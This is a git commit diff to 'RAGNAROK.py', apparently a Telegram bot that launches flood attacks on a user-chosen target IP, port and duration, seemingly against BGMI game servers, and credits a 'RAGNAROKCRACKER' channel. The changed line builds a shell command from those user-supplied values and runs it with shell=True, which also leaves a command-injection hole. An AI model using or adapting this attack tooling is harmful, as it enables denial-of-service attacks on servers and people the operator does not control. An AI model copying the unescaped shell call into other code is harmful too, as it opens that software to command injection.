6a75bbb6992de3a9264aaba402d6fb6435b82ab0
yandexmail90 <nam.shah@yandex.com>
2025-01-16 14:19:23 +0530

    Update RAGNAROK.py

--- RAGNAROK.py
+++ RAGNAROK.py
@@ -245,7 +245,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./RAGNAROK {target} {port} {time}"
+                full_command = f"./RAGNAROK {target} {port} {time} CRACKS"
                 subprocess.run(full_command, shell=True)
                 response = f"RAGNAROK 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/RAGNAROKCRACKER"
         else:
